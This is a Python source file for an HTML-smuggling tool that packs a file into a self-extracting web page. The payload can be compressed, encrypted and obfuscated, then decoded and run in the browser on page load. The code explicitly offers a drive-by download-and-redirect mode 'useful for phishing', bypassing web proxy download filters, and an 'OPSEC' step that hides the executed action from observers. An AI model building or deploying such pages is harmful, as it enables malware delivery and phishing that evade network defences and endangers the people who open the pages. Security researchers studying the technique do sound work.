#!/usr/bin/env python3
import argparse
import base64
import gzip
import json
import os
import sys
from typing import Optional, Any
# local
from .minified_js import B64DECODE, B85DECODE, DECRYPT, UNZIP
from .static_js import HEXDUMP, DECODE_AND_EVAL_ACTION, JS_DOWNLOAD, JS_DRIVEBY_REDIRECT, JS_EVAL, JS_REPLACE, JS_SHOW_TEXT

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
DEFAULT_TEMPLATE_FILE = os.path.join(SCRIPT_DIR, "template.html")


def get_javascript(args: Any, file_name: str) -> str:
    if args.download != None:
        # If args.downlaod is empty, use the name of the input file, otherwise use the user provided value
        return JS_DOWNLOAD.replace("{{NAME}}", args.download or file_name)
    elif args.eval:
        return JS_EVAL
    elif args.replace:
        return JS_REPLACE
    elif args.show_text:
        return JS_SHOW_TEXT
    elif args.driveby_redirect != None:
        return JS_DRIVEBY_REDIRECT.replace("{{REDIRECT_URL}}", args.driveby_redirect).replace("{{NAME}}", file_name)
    elif args.custom != None:
        return args.custom
    else:
        raise Exception("Bug: Should not happen, since one of the payload parameters is required")

PRINT_INFO_MESSAGES = True

def print_info(message):
    # Since the output may be written to stdout, we write info messages to stderr.
    # This makes them visible to the user but not to the next program in the pipe
    if PRINT_INFO_MESSAGES:
        print(f"[*] {message}", file=sys.stderr)


class PageBuilder:
    def __init__(self, input_file: str, template_file: str, js_payload: str, encryption_password: Optional[str], password_hint: str, page_title: str, page_html: str, obscure_action: bool) -> None:
        try:
            with open(template_file, "r") as f:
                self.template = f.read()
        except:
            raise Exception(f"Failed to load template file '{template_file}'. Try specifying a different file with the --template option")

        self.template = self.template.replace("{{TITLE}}", page_title)
        self.template = self.template.replace("{{HTML}}", page_html)
        self.obscure_action = obscure_action

        try:
            if input_file == "-":
                # Read the buffer to get data as binary
                self.input_data = sys.stdin.buffer.read()
            else:
                with open(input_file, "rb") as f:
                    self.input_data = f.read()
        except:
            raise Exception(f"Failed to load input file '{input_file}'")

        self.js_payload = js_payload
        # Nonce reuse should be save, since only one of the results should be used (we may need to encrypt multiple time if some parameters have the `auto` value)
        if encryption_password:
            try:
                # Conditional import, since it is not always needed and loads an external library
                from .crypto import EfficientEncryptor
                self.encryptor = EfficientEncryptor(encryption_password.encode())
                escaped_hint_wrapped_in_quotes = json.dumps(password_hint) # @TODO: In theory this might work, try it out in practice
                self.decrypt_code = DECRYPT.replace('"PW_PROMPT"', escaped_hint_wrapped_in_quotes)
            except Exception as ex:
                print("[!]", ex)
                print("[*] Hint: Please make sure, that 'pycryptodomex' is installed. You can install it by running:")
                print("python3 -m pip install pycryptodomex")
                exit(1)
        else:
            self.encryptor = None

    def build_page(self, compression: str, encoding: str, insert_debug_statements: bool) -> str:
        compression_list = ["none", "gzip"] if compression == "auto" else [compression]
        encoding_list = ["base64", "ascii85"] if encoding == "auto" else [encoding]
        variants = []

        for c in compression_list:
            for e in encoding_list:
                page = self.build_page_no_auto(c, e, insert_debug_statements)
                print_info(f"Testing combination: {c} & {e} => {len(page)} bytes")
                variants.append(page)

        # Return the shortest result
        return sorted(variants, key=lambda x: len(x))[0]

    def build_page_no_auto(self, compression: str, encoding: str, insert_debug_statements: bool) -> str:
        library_code = ""
        encoded_data = self.input_data
        js_payload_action = self.js_payload

        if self.encryptor:
            library_code += self.decrypt_code
            # OPSEC: Also encrypt the action, so that an observer can not see/flag what we want to do
            # We hack this into the existing schema by encrypting <PAYLOAD_ACTION_JS_TO_EVAL>\x00<ORIGINAL_DATA>.
            # Since encryption is done after compression, we should also compress our data (otherwise the handling gets hard)
            encoded_data = js_payload_action.encode() + b"\x00" + encoded_data
            # Then we modify our action to extract the code to execute and the original data.
            # This is much easier than modifying the existing encryption code to reuse the password, key, etc and perform separate decryptions for the payload and the action
            js_payload_action = "idx=og_data.indexOf(0);code=new TextDecoder().decode(og_data.slice(0,idx));og_data=og_data.slice(idx+1);eval(code);"

        if self.obscure_action:
            # takes a string, base64 encodes it, splits it into chunks of 5 characters, reverses their order and joins them with a -
            encoded_action = base64.b64encode(js_payload_action.encode()).decode()
            obscured_action = ('-'.join([b[::-1] for b in [encoded_action[i: i+5] for i in range(0, len(encoded_action), 5)]]))
            js_payload_action = DECODE_AND_EVAL_ACTION.replace("{{OBSCURED_ACTION}}", obscured_action)

        if compression == "gzip":
            library_code += UNZIP
            encoded_data = gzip.compress(encoded_data)
        elif compression == "none":
            pass
        else:
            raise Exception(f"Unknown compression method '{compression}'")

        if self.encryptor:
            encoded_data = self.encryptor.encrypt_with_reused_iv(encoded_data)

        if encoding == "ascii85":
            library_code += B85DECODE
            decode_fn = "decode"
            encoded_data = base64.a85encode(encoded_data, adobe=True).replace(b'"', b"v").replace(b"\\", b"w")
        elif encoding == "base64":
            library_code += B64DECODE
            decode_fn = "await decodeAsync"
            encoded_data = base64.b64encode(encoded_data)
        else:
            raise Exception(f"Unknown encoding method '{compression}'")

        if insert_debug_statements:
            library_code += HEXDUMP
            glue_decrypt = ""
            if self.encryptor:
                glue_decrypt += "data=await decryptLoop(data);log_hexdump('Decrypted',data);"
            if compression == "gzip":
                glue_decrypt += "data=unzip(data);log_hexdump('Unzipped',data);"

            glue_code = f"""async function main(data) {{
    log_hexdump('Encoded',data);
    data={decode_fn}(data);log_hexdump('Decoded',data);
    {glue_decrypt}
    action(data);
}}main(c_data);""".replace("\n", "").replace("\r", "").replace("    ", "")
        else:
            # We start with the input argument and then wrap it in more and more method calls
            glue_code = "data"
            glue_code = f"{decode_fn}({glue_code})"
            if self.encryptor:
                glue_code = f"await decryptLoop({glue_code})"
            if compression == "gzip":
                glue_code = f"unzip({glue_code})"

            glue_code = f"action({glue_code})"
            glue_code = "async function main(data){" + glue_code + "};main(c_data);"

        return self.replace_in_template(library_code, glue_code, js_payload_action, encoded_data)

    def replace_in_template(self, library_code: str, glue_code: str, payload_code: str, encoded_data: bytes) -> str:
        return (self.template
                .replace("{{LIBRARY_CODE}}", library_code)
                .replace("{{GLUE_CODE}}", glue_code)
                .replace("{{PAYLOAD_CODE}}", payload_code)
                .replace("{{DATA}}", encoded_data.decode())
        )


def main() -> None:
    # @TODO: Support multiple input files for certain options (download, driveby, etc)?
    ap = argparse.ArgumentParser(description="This tools can create self-decompressing HTML pages, that can be used to minify documents or circumvent web proxy download restrictions and filtering.")
    # ap_input = ap.add_argument_group("input options")
    # ap_input_mutex = ap_input.add_mutually_exclusive_group(required=True)
    ap.add_argument("file", help="the file to encode. Use '-' to read from standard input")
    # ap_input_mutex.add_argument("-F", "--file-list", help="a list of files to") # @TODO: If i add this, how will output options work?

    ap_output = ap.add_argument_group("output options")
    ap_output.add_argument("-o", "--output", help="the location to write the output to. If not specified stdout will be used instead")
    ap_output.add_argument("-O", "--open", action="store_true", help="if writing output to a file, try to immediately open the file in the default web browser afterwards")
    ap_output.add_argument("-q", "--quiet", action="store_true", help="minimize console output")

    payload_option_visual_group = ap.add_argument_group("action to perform with the payload")
    payload_option_mutex = payload_option_visual_group.add_mutually_exclusive_group(required=True)
    payload_option_mutex.add_argument("--download", nargs="?", metavar="FILE_NAME", const="", help="show a download link to download the payload as a file. If you specify an argument that is used as the name of the file to download")
    payload_option_mutex.add_argument("--eval", action="store_true", help="pass the payload to eval() to run it as JavaScript code")
    payload_option_mutex.add_argument("--replace", action="store_true", help="replace the page's content with the payload. Use this to compress HTML pages")
    payload_option_mutex.add_argument("--show-text", action="store_true", help="use this to show plain text. Unlike --replace this does not interpret HTML tags and does not change whitespace")
    payload_option_mutex.add_argument("--driveby-redirect", metavar="REDIRECT_URL", help="downlaod the payload as a file in the background and immediately redirect the user to another site. Useful for phishing")
    payload_option_mutex.add_argument("--custom", metavar="YOUR_JAVASCRIPT_CODE", help="run your own action. Provide a JavaScript snippet that uses the decoded payload, which is stored in the 'og_data' variable. Note that data is a byte array, so you likely want to use 'new TextDecoder().decode(og_data)' to convert it to Unicode")

    ap_settings = ap.add_argument_group("settings")
    ap_settings.add_argument("-c", "--compression", default="auto", choices=["auto", "none", "gzip"], help="how to compress the contents (default: auto)")
    ap_settings.add_argument("-e", "--encoding", default="auto", choices=["auto", "base64", "ascii85"], help="how to encode the binary data  (default: auto). base64 may not work for large contents (>65kB) due to different browser limitations")
    ap_settings.add_argument("-p", "--password", help="encrypt the compressed data using this password")
    ap_settings.add_argument("-P", "--password-prompt", default="Please enter the decryption password", help="provide your custom password prompt, that can for example be used to provide a password hint")
    ap_settings.add_argument("--console-log", action="store_true", help="insert debug statements to see the output of the individual steps")
    
    ap_template = ap.add_argument_group("template settings")
    ap_template.add_argument("--template", help="use this template file instead of the default one")
    ap_template.add_argument("--title", default="Self Extracting Page", help="set the title of the HTML page")
    initial_page_contents_mutex = ap_template.add_mutually_exclusive_group()
    initial_page_contents_mutex.add_argument("--html", metavar="HTML_STRING", help="the HTML to show when the page is first loaded or if the unpacking fails")
    initial_page_contents_mutex.add_argument("--html-file", metavar="FILE", help="like --html, but read the contents from the given file")
    ap_template.add_argument("--obscure-action", action="store_true", help="obscures the action JavaScript code")
    args = ap.parse_args()

    if args.quiet:
        global PRINT_INFO_MESSAGES
        PRINT_INFO_MESSAGES = False

    if args.html != None:
        initial_page_contents = args.html
    elif args.html_file != None:
        try:
            with open(args.html_file, "r") as f:
                initial_page_contents = f.read()
        except Exception as e:
            print(f"[!] Failed to read file '{args.html_file}' from argument --html-file: {e}")
            exit(1)
    else:
        # No argument give, use the default
        initial_page_contents = "<h1>Unpacking...</h1><p>If you can read this, the extraction probably did not work. Please disable plugins (such as NoScript), which may block this page from running the extraction JavaScript code.</p>"
        if args.console_log:
            initial_page_contents += "<p>This page was built with debugging enabled, so you should be able to see the hexdumps of the intermediate steps in the browser's console (F12).</p>"
        else:
            initial_page_contents += "<p>Tip: You can use the --console-log option when building the page to show hexdumps of the intermediate steps in the browser console. This may help with debugging.</p>"


    template_file = args.template or DEFAULT_TEMPLATE_FILE
    file_name = os.path.basename(args.file)
    java_script = get_javascript(args, file_name)

    page_builder = PageBuilder(args.file, template_file, java_script, args.password, args.password_prompt, args.title, initial_page_contents, args.obscure_action)
    html_page = page_builder.build_page(args.compression, args.encoding, args.console_log)

    if args.output:
        with open(args.output, "w") as f:
            f.write(html_page)

        if args.open:
            url = f"file://{os.path.realpath(args.output)}"
            if args.password:
                url += f"#{args.password}"
            print_info(f"Opening {url} in webbrowser")
            import webbrowser
            webbrowser.open(url)
    else:
        print(html_page)
        if args.open:
            print_info("Ignoring -O/--open since the output is stdout")


if __name__ == "__main__":
    main()
